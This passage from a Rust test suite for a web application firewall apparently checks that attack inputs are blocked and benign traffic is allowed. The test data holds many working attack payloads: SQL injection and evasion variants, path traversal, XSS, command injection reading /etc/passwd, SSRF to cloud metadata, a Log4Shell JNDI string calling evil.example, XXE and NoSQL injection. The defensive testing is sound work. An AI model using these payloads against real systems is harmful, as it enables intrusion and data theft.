                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            ),
        );
        headers.insert(
            header::REFERER,
            HeaderValue::from_static("http://127.0.0.1:8080/dashboard?tab=services"),
        );
        headers.insert(
            header::COOKIE,
            HeaderValue::from_static(
                "exposure_clearance=eyJhbGciOiJIUzI1NiJ9.payload.sig; id=42; theme=dark",
            ),
        );

        let v = crs.inspect_head(
            &cfg,
            "/api/v1/services/web-main",
            Some("page=2&limit=50&sort=updated_at&q=hello+world"),
            &headers,
        );
        assert!(matches!(v, WafVerdict::Allow), "unexpected verdict: {v:?}");

        let large_json = format!(
            r#"{{"items":[{}],"note":"Please select your preferred package (20% off today)"}}"#,
            (0..80)
                .map(|i| format!(r#"{{"id":{i},"name":"item_{i}","active":true}}"#))
                .collect::<Vec<_>>()
                .join(",")
        );
        assert!(large_json.len() > 2500);
        let bv = crs.inspect_body(&cfg, Some("application/json"), large_json.as_bytes());
        assert!(matches!(bv, WafVerdict::Allow), "unexpected body verdict: {bv:?}");
    }

    #[test]
    fn blocks_common_web_attacks_across_path_query_headers_and_body() {
        let cfg = block_cfg();
        let crs = builtin_engine();
        let empty = HeaderMap::new();

        // SQLi in query (both %20 and + space encoding)
        assert!(crs.inspect_head(&cfg, "/search", Some("q=admin'+OR+'1'='1'+--"), &empty).is_block());
        assert!(crs
            .inspect_head(
                &cfg,
                "/items",
                Some("id=1%20UNION%20SELECT%20username,password%20FROM%20users"),
                &empty
            )
            .is_block());

        // Path Traversal in path
        assert!(crs.inspect_head(&cfg, "/files/../../../../etc/passwd", None, &empty).is_block());

        // XSS in query
        assert!(crs
            .inspect_head(&cfg, "/profile", Some("bio=%3Csvg%20onload%3Dalert(1)%3E"), &empty)
            .is_block());

        // Command Injection in query
        assert!(crs
            .inspect_head(&cfg, "/ping", Some("host=1.1.1.1;cat${IFS}/etc/passwd"), &empty)
            .is_block());

        // SSRF in query
        assert!(crs
            .inspect_head(
                &cfg,
                "/fetch",
                Some("url=http://169.254.169.254/latest/meta-data/"),
                &empty
            )
            .is_block());

        // SSTI arithmetic template expression in query
        assert!(crs
            .inspect_head(&cfg, "/render", Some("name={{7*7}}"), &empty)
            .is_block());
        assert!(crs
            .inspect_head(&cfg, "/render", Some("name=${7*7}"), &empty)
            .is_block());
        // Benign template interpolation without arithmetic must NOT be flagged
        assert!(matches!(
            crs.inspect_head(&cfg, "/render", Some("name={{username}}"), &empty),
            WafVerdict::Allow
        ));

        // Log4Shell / JNDI in User-Agent
        let mut log4j_hdrs = HeaderMap::new();
        log4j_hdrs.insert(
            header::USER_AGENT,
            HeaderValue::from_static("${jndi:ldap://evil.example/Exploit}"),
        );
        match crs.inspect_head(&cfg, "/", None, &log4j_hdrs) {
            WafVerdict::Block(f) => {
                assert_eq!(f.category, "deserialization");
                assert_eq!(f.location, "header:user-agent");
            }
            other => panic!("expected block, got {other:?}"),
        }

        // NoSQL injection in JSON body
        let nosql = br#"{"username":{"$ne":null},"password":{"$gt":""}}"#;
        match crs.inspect_body(&cfg, Some("application/json"), nosql) {
            WafVerdict::Block(f) => {
                assert_eq!(f.category, "nosql-injection");
                assert_eq!(f.location, "body");
            }
            other => panic!("expected block, got {other:?}"),
        }

        // SQLi in form-urlencoded body with `+` spaces
        let form = b"user=admin'+OR+'1'='1'+--&pass=123";
        assert!(crs.inspect_body(&cfg, Some("application/x-www-form-urlencoded"), form).is_block());
        // Double-equals tautology (`1==1`) in a password field must still be blocked.
        let form_eq = b"username=zhouyitian2403&password=%27+or+1%3D%3D1+--";
        assert!(crs.inspect_body(&cfg, Some("application/x-www-form-urlencoded"), form_eq).is_block());

        // XXE in XML body
        let xxe = br#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>"#;
        assert!(crs.inspect_body(&cfg, Some("application/xml"), xxe).is_block());
    }

    #[test]
    fn respects_modes_categories_and_exempt_paths() {
        let crs = builtin_engine();
        let empty = HeaderMap::new();

        // Off mode allows everything
        let off = WafConfig {
            mode: WafMode::Off,
            ..Default::default()
        };
        assert!(matches!(
            crs.inspect_head(&off, "/../../etc/passwd", None, &empty),
            WafVerdict::Allow
        ));

        // Monitor mode reports finding without blocking
        let mon = WafConfig {
            mode: WafMode::Monitor,
            ..Default::default()
        };
        assert!(matches!(
            crs.inspect_head(&mon, "/search", Some("q=<script>alert(1)</script>"), &empty),
            WafVerdict::Monitor(f) if f.category == "xss"
        ));

        // Category filter: SQLi-only ignores XSS but blocks SQLi
        let sqli_only = WafConfig {
            mode: WafMode::Block,
            categories: vec![WafCategory::SqlInjection],
            ..Default::default()
        };
        assert!(matches!(
            crs.inspect_head(&sqli_only, "/search", Some("q=<script>alert(1)</script>"), &empty),
            WafVerdict::Allow
        ));
        assert!(crs
            .inspect_head(&sqli_only, "/search", Some("q=' OR '1'='1"), &empty)
            .is_block());

        // Exempt path respects segment boundary
        let exempt = WafConfig {
            mode: WafMode::Block,
            exempt_paths: vec!["/api/webhooks".into()],
            ..Default::default()
        };
        assert!(matches!(
            crs.inspect_head(&exempt, "/api/webhooks/stripe", Some("q=' OR '1'='1"), &empty),
            WafVerdict::Allow
        ));
        assert!(crs
            .inspect_head(&exempt, "/api/webhooks-other", Some("q=' OR '1'='1"), &empty)
            .is_block());
    }

    #[test]
    fn inspects_bodies_regardless_of_spoofable_content_type() {
        let cfg = block_cfg();
        let mut h_multi = HeaderMap::new();
        h_multi.insert(
            header::CONTENT_TYPE,
            HeaderValue::from_static("multipart/form-data; boundary=----abc"),
        );
        assert_eq!(
            should_inspect_body(&cfg, &Method::POST, &h_multi, false),
            Some(32 * 1024)
        );

        let mut h_octet = HeaderMap::new();
        h_octet.insert(
            header::CONTENT_TYPE,
            HeaderValue::from_static("application/octet-stream"),
        );
        assert_eq!(
            should_inspect_body(&cfg, &Method::POST, &h_octet, false),
            Some(32 * 1024)
        );

        let mut h_json = HeaderMap::new();
        h_json.insert(header::CONTENT_TYPE, HeaderValue::from_static("application/json; charset=utf-8"));
        assert_eq!(
            should_inspect_body(&cfg, &Method::POST, &h_json, false),
            Some(32 * 1024)
        );
        assert!(should_inspect_body(&cfg, &Method::GET, &h_json, false).is_none());
        // Upgrade header on POST/DELETE must NOT bypass WAF body inspection
        assert_eq!(
            should_inspect_body(&cfg, &Method::POST, &h_json, true),
            Some(32 * 1024)
        );
        assert_eq!(
            should_inspect_body(&cfg, &Method::DELETE, &h_json, false),
            Some(32 * 1024)
        );
    }

    #[test]
    fn compiled_crs_engine_matches_and_respects_disabled_ids() {
        let engine = builtin_engine();
        assert!(engine.rule_count() >= 14);

        let cfg = block_cfg();
        let mut h_scan = HeaderMap::new();
        h_scan.insert(header::USER_AGENT, HeaderValue::from_static("sqlmap/1.8.2#stable"));
        match engine.inspect_head(&cfg, "/", None, &h_scan) {
            WafVerdict::Block(f) => {
                assert_eq!(f.rule_id, Some(913100));
                assert_eq!(f.category, "scanner");
            }
            other => panic!("expected CRS 913100 block, got {other:?}"),
        }

        // Disabling rule 913100 allows that User-Agent through
        let mut cfg_dis = block_cfg();
        cfg_dis.disabled_rule_ids = vec![913100];
        assert!(matches!(
            engine.inspect_head(&cfg_dis, "/", None, &h_scan),
            WafVerdict::Allow
        ));
    }

    #[test]
    fn closes_sqli_tautology_cmdi_and_encoded_crs_gaps_without_false_positives() {
        let cfg = block_cfg();
        let crs = builtin_engine();
        let empty = HeaderMap::new();

        for (path, q) in [
            ("/oauth/authorize", "client_id=1%20OR%201%3D1"),
            ("/oauth/authorize", "client_id=1 OR 1=1"),
            ("/oauth/authorize", "client_id=1 AND 1=2"),
            ("/oauth/authorize", "client_id=;id"),
            ("/oauth/authorize", "client_id=;id;#"),
            ("/oauth/authorize", "client_id=%3Bid%3B%23"),
            ("/oauth/authorize", "client_id=;ls"),
            ("/oauth/authorize", "client_id=%3Bls%20-la"),
            ("/oauth/authorize", "client_id=;echo%20hi"),
        ] {
            let v_crs = crs.inspect_head(&cfg, path, Some(q), &empty);
            assert!(
                v_crs.is_block(),
                "expected block on `{path}?{q}`, crs={v_crs:?}"
            );
        }

        // Benign inputs including JSON `#` and `--` strings and normal cookies must NOT trigger
        let mut h_benign = HeaderMap::new();
        h_benign.insert(
            header::USER_AGENT,
            HeaderValue::from_static("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36"),
        );
        h_benign.insert(header::COOKIE, HeaderValue::from_static("a=1; id=2; session=ok"));
        assert!(matches!(
            crs.inspect_head(&cfg, "/oauth/authorize", Some("client_id=web-portal&state=xyz"), &h_benign),
            WafVerdict::Allow
        ));
        let benign_json_dash = br##"{"bio":"#rust","flag":"--help","note":"please select or check"}"##;
        assert!(matches!(
            crs.inspect_body(&cfg, Some("application/json"), benign_json_dash),
            WafVerdict::Allow
        ));
    }

    #[test]
    fn multipart_form_password_change_is_not_flagged_as_sqli() {
        let ct = "multipart/form-data; boundary=----WebKitFormBoundaryj6JLA4PBd9AdFCsM";
        let body = concat!(
            "------WebKitFormBoundaryj6JLA4PBd9AdFCsM\r\n",
            "Content-Disposition: form-data; name=\"old_password\"\r\n\r\n",
            "upxg5lky@\r\n",
            "------WebKitFormBoundaryj6JLA4PBd9AdFCsM\r\n",
            "Content-Disposition: form-data; name=\"new_password\"\r\n\r\n",
            "12345678\r\n",
            "------WebKitFormBoundaryj6JLA4PBd9AdFCsM--\r\n",
        );

        let evilpot_cfg = WafConfig {
            mode: WafMode::Evilpot,
            ..Default::default()
        };
        let builtin = builtin_engine();
        assert!(matches!(
            builtin.inspect_body(&evilpot_cfg, Some(ct), body.as_bytes()),
            WafVerdict::Allow
        ));

        // Simulate synced OWASP CRS SQL comment rule (942440) that matches `--` on raw framing
        let mut with_942440 = builtin_crs_snapshot().rules;
        with_942440.push(WafRuleDescriptor {
            id: 942440,
            source: "owasp-crs".into(),
            file: "REQUEST-942-APPLICATION-ATTACK-SQLI.conf".into(),
            category: "sql-injection".into(),
            paranoia_level: 1,
            severity: "CRITICAL".into(),
            msg: "SQL Comment Sequence Detected".into(),
            targets: vec!["ARGS".into(), "REQUEST_BODY".into()],
            operator: "rx".into(),
            pattern: r"/\*!?|\*/|--|#".into(),
            tags: vec!["attack-sqli".into()],
            enabled: true,
        });
        let synced_engine = CompiledCrsEngine::compile(&with_942440, &[]);
        assert!(
            matches!(synced_engine.inspect_body(&evilpot_cfg, Some(ct), body.as_bytes()), WafVerdict::Allow),
            "legitimate WebKitFormBoundary password submission must NOT trigger SQL comment/SQLi rule"
        );
    }

    #[test]
    fn multipart_form_real_sqli_inside_field_is_still_caught() {
        let ct = "multipart/form-data; boundary=----WebKitFormBoundaryj6JLA4PBd9AdFCsM";
        let body = concat!(
            "------WebKitFormBoundaryj6JLA4PBd9AdFCsM\r\n",
            "Content-Disposition: form-data; name=\"old_password\"\r\n\r\n",
            "' OR 1=1 --\r\n",
            "------WebKitFormBoundaryj6JLA4PBd9AdFCsM\r\n",
            "Content-Disposition: form-data; name=\"new_password\"\r\n\r\n",
            "12345678\r\n",
            "------WebKitFormBoundaryj6JLA4PBd9AdFCsM--\r\n",
        );
        let cfg = block_cfg();
        let crs = builtin_engine();
        match crs.inspect_body(&cfg, Some(ct), body.as_bytes()) {
            WafVerdict::Block(f) => {
                assert_eq!(f.category, "sql-injection");
                assert_eq!(f.location, "body:multipart-field");
            }
            other => panic!("expected Block for real SQLi inside multipart field, got {other:?}"),
        }
    }

    #[test]
    fn multipart_form_malicious_filename_is_caught() {
        let ct = "multipart/form-data; boundary=----WebKitFormBoundaryUpload1";
        let body = concat!(
            "------WebKitFormBoundaryUpload1\r\n",
            "Content-Disposition: form-data; name=\"avatar\"; filename=\"../../etc/passwd\"\r\n",
            "Content-Type: application/octet-stream\r\n\r\n",
            "\x00\x01\x02BINARYDATA\r\n",
            "------WebKitFormBoundaryUpload1--\r\n",
        );
        let cfg = block_cfg();
        let crs = builtin_engine();
        match crs.inspect_body(&cfg, Some(ct), body.as_bytes()) {
            WafVerdict::Block(f) => {
                assert_eq!(f.category, "path-traversal");
                assert_eq!(f.location, "body:multipart-filename");
            }
            other => panic!("expected Block for malicious multipart filename, got {other:?}"),
        }
    }

    #[test]
    fn spoofed_multipart_content_type_without_boundary_prefix_cannot_bypass() {
        let ct = "multipart/form-data; boundary=fakeboundary";
        let raw_sqli = b"' UNION SELECT username, password FROM users --";
        let cfg = block_cfg();
        let crs = builtin_engine();
        match crs.inspect_body(&cfg, Some(ct), raw_sqli) {
            WafVerdict::Block(f) => {
                assert_eq!(f.category, "sql-injection");
                assert_eq!(f.location, "body");
            }
            other => panic!("spoofed multipart Content-Type must not bypass WAF, got {other:?}"),
        }
    }

    #[test]
    fn detects_advanced_sqli_and_double_encoded_payloads() {
        let cfg = block_cfg();
        let crs = builtin_engine();
        let empty = HeaderMap::new();

        // Regression set: classic tautologies, no-whitespace/comment obfuscation, parenthesised
        // operands, hex literals, string comparison operators, `||` concatenation and subqueries.
        let payloads = [
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "admin'--",
            "' OR 1=1#",
            "1 OR 1=1",
            "1' AND 1=1--",
            "\" OR \"\"=\"",
            "' OR 'x'='x",
            "1)) OR 1=1--",
            "' or sleep(5)--",
            "1;WAITFOR DELAY '0:0:5'--",
            "' UNION SELECT NULL--",
            "-1 UNION SELECT 1,2,3",
            "1 AND (SELECT 1 FROM dual)",
            "'or'a'='a",
            "'||'1'='1",
            "') OR ('1'='1",
            "1'||pg_sleep(5)--",
            "' OR 1=1 LIMIT 1--",
            "1' ORDER BY 1--",
            "' OR '1'='1' /*",
            "0x31 OR 0x31=0x31",
            "1 OR 1=1 -- -",
            "' OR 2>1--",
            "' OR 'a'<'b",
            "' OR TRUE--",
            "') OR 1=1--",
            "1) OR 1=1--",
            "UNION/**/SELECT username FROM users",
            // Regression: previously missed by the built-in SQLi rule.
            "1' order by 1,2,3--",
            "1 group by 1 having 1=1--",
            "' or 1#",
            "1' or/**/1=1--",
            "1 and exists(select * from users)",
            "1\" or \"1\"=\"1",
            "1' %0b or %0b 1=1--",
            "' or 1==1 --",
            "1 or 1==1#",
        ];
        for p in payloads {
            let q = format!("q={p}");
            let hv = crs.inspect_head(&cfg, "/search", Some(&q), &empty);
            assert!(hv.is_block(), "query SQLi missed: {p:?} => {hv:?}");
            let bv = crs.inspect_body(&cfg, Some("application/x-www-form-urlencoded"), q.as_bytes());
            assert!(bv.is_block(), "body SQLi missed: {p:?} => {bv:?}");
        }

        // Double / triple percent-encoded tautology must still be normalised and blocked.
        for enc in [
            "%2527%2520OR%25201%253D1",
            "%252527%252520OR%2525201%25253D1",
            "%2531%2520AND%2520%2528SELECT%25201%2520FROM%2520dual%2529",
        ] {
            let q = format!("q={enc}");
            assert!(
                crs.inspect_head(&cfg, "/search", Some(&q), &empty).is_block(),
                "double-encoded SQLi missed: {enc}"
            );
        }

        // Natural-language use of `or`/`and` must not be flagged as SQLi tautology.
        for benign in [
            "choose true or false",
            "the value is 5 or 6",
            "please select or check the box",
            "search or browse items",
        ] {
            let q = format!("q={benign}");
            assert!(
                matches!(crs.inspect_head(&cfg, "/search", Some(&q), &empty), WafVerdict::Allow),
                "benign phrase falsely flagged: {benign:?}"
            );
        }
    }

    #[test]
    fn blocks_broader_evasion_variants_across_categories() {
        let cfg = block_cfg();
        let crs = builtin_engine();
        let empty = HeaderMap::new();

        // (path, query) that must all be blocked. Covers SQLi predicate/operator variants,
        // comment-obfuscated UNION, XSS event handlers/pseudo-protocol splits, SSRF decimal/hex
        // encodings, generic NoSQL operators, SSTI globals/ERB and LF-only CRLF injection.
        let attacks: &[(&str, &str)] = &[
            ("/", "q=1 or 1 like 1"),
            ("/", "q=1 or 1 between 0 and 2"),
            ("/", "q=1 and 1 in (1)"),
            ("/", "q=1 or '1' regexp '1'"),
            ("/", "q=1 or(1)=(1)"),
            ("/", "q=1 || 1=1"),
            ("/", "q=1 && 1=1"),
            ("/", "q=1 or null is null"),
            ("/", "q=1 or 1 is not null"),
            ("/", "q=1 or not 1=2"),
            ("/", "q=1 union%23%0aselect 1,2"),
            ("/", "q=1 /*!50000union*/ select 1"),
            ("/", "q=1 union /*!50000select*/ 1"),
            ("/", "q=1'||'1"),
            ("/", "q=<details open ontoggle=alert(1)>"),
            ("/", "q=<input autofocus onfocus=alert(1)>"),
            ("/", "q=<marquee onstart=alert(1)>"),
            ("/", "q=java\tscript:alert(1)"),
            ("/", "u=http://2852039166/"),
            ("/", "u=http://0x7f000001/"),
            ("/", "u=http://127.1/"),
            ("/", "u=$where"),
            ("/", "u[\"$regex\"]=.*"),
            ("/", "n={{config}}"),
            ("/", "n={{self}}"),
            ("/", "n=<%= 7*7 %>"),
            ("/", "n=%0aSet-Cookie:x=1"),
        ];
        for (path, q) in attacks {
            let v = crs.inspect_head(&cfg, path, Some(*q), &empty);
            assert!(v.is_block(), "evasion missed: {q:?} => {v:?}");
        }

        // Benign values that must NOT be blocked by the broadened rules.
        let benign: &[(&str, &str)] = &[
            ("/search", "q=either this or that"),
            ("/search", "q=true or false"),
            ("/search", "q=cat and dog"),
            ("/search", "q=order by date"),
            ("/api", "q=age>=18"),
            ("/search", "q={{name}}"),
            ("/profile", "bio=Hello, I like C++ and C#."),
        ];
        for (path, q) in benign {
            let v = crs.inspect_head(&cfg, path, Some(*q), &empty);
            assert!(matches!(v, WafVerdict::Allow), "benign falsely flagged: {q:?} => {v:?}");
        }
    }

    #[test]
    fn form_sqli_evasion_vectors_and_stale_node_rules_are_blocked() {
        let cfg = block_cfg();
        let crs = builtin_engine();

        // 1. Stale `crs_rules` (e.g. old `node.yaml` with old 942100 matching only single `=`)
        //    must NOT shadow upgraded built-in `942100` (`={1,3}`).
        let stale_old_rules = vec![WafRuleDescriptor {
            id: 942100,
            source: "owasp-crs".into(),
            file: "REQUEST-942-APPLICATION-ATTACK-SQLI.conf".into(),
            category: "sql-injection".into(),
            paranoia_level: 1,
            severity: "CRITICAL".into(),
            msg: "Old SQLi 942100".into(),
            targets: vec!["ARGS".into(), "REQUEST_BODY".into()],
            operator: "rx".into(),
            pattern: r"(?i)'\s+or\s+1=1\b".into(),
            tags: vec!["attack-sqli".into()],
            enabled: true,
        }];
        let merged_engine = CompiledCrsEngine::compile(&stale_old_rules, &[]);
        let payload = b"username=zhouyitian2403&password=%27+or+1%3D%3D1+--";
        assert!(
            merged_engine
                .inspect_body(&cfg, Some("application/x-www-form-urlencoded"), payload)
                .is_block(),
            "stale crs_rules must not shadow upgraded built-in 942100"
        );

        // Explicitly disabling 942100 via descriptor still disables it
        let mut dis_rule = stale_old_rules;
        dis_rule[0].enabled = false;
        let disabled_engine = CompiledCrsEngine::compile(&dis_rule, &[]);
        assert!(matches!(
            disabled_engine.inspect_body(&cfg, Some("application/x-www-form-urlencoded"), payload),
            WafVerdict::Allow
        ));

        // 2. Across Content-Type variants (charset, JSON, raw/empty, multipart w/ spoofed binary MIME on non-file field)
        assert!(crs
            .inspect_body(
                &cfg,
                Some("application/x-www-form-urlencoded; charset=UTF-8"),
                payload
            )
            .is_block());
        assert!(crs.inspect_body(&cfg, None, payload).is_block());
        assert!(crs
            .inspect_body(
                &cfg,
                Some("application/json"),
                br#"{"username":"zhouyitian2403","password":"' or 1==1 --"}"#
            )
            .is_block());

        let mp_ct = "multipart/form-data; boundary=----B123";
        let mp_spoof_mime = concat!(
            "------B123\r\n",
            "Content-Disposition: form-data; name=\"password\"\r\n",
            "Content-Type: image/png\r\n\r\n",
            "' or 1==1 --\r\n",
            "------B123--\r\n"
        );
        assert!(crs
            .inspect_body(&cfg, Some(mp_ct), mp_spoof_mime.as_bytes())
            .is_block());

        // 3. Preceded by invalid UTF-8 bytes must not truncate inspection
        let invalid_utf8 = b"username=\xff\xfe&password=%27+or+1%3D%3D1+--";
        assert!(crs
            .inspect_body(&cfg, Some("application/x-www-form-urlencoded"), invalid_utf8)
            .is_block());

        // 4. Padded past 8 KiB (`MAX_CRS_SCAN_BYTES`) and past 256 form params (`MAX_WAF_FORM_PARAMS`)
        let pad_8k = format!(
            "username=zhouyitian2403&pad={}&password=%27+or+1%3D%3D1+--",
            "a".repeat(12_000)
        );
        assert!(crs
            .inspect_body(
                &cfg,
                Some("application/x-www-form-urlencoded"),
                pad_8k.as_bytes()
            )
            .is_block());

        let mut many_params = String::new();
        for i in 0..270 {
            many_params.push_str(&format!("k{i}=v{i}&"));
        }
        many_params.push_str("password=%27+or+1%3D%3D1+--");
        assert!(crs
            .inspect_body(
                &cfg,
                Some("application/x-www-form-urlencoded"),
                many_params.as_bytes()
            )
            .is_block());

        // 5. Comment obfuscation (`*/or/**/1==1`), path traversal exemption bypass, and multi-Cookie HTTP/2 headers
        assert!(crs
            .inspect_head(&cfg, "/login", Some("p=1/**/or/**/1==1--"), &HeaderMap::new())
            .is_block());
        assert!(!is_path_exempt(
            "/api/webhooks/../../login",
            &["/api/webhooks/".into()]
        ));

        let mut h2_cookies = HeaderMap::new();
        h2_cookies.append(header::COOKIE, HeaderValue::from_static("session=abc"));
        h2_cookies.append(header::COOKIE, HeaderValue::from_static("auth=' or 1==1 --"));
        assert!(crs.inspect_head(&cfg, "/login", None, &h2_cookies).is_block());
    }
}
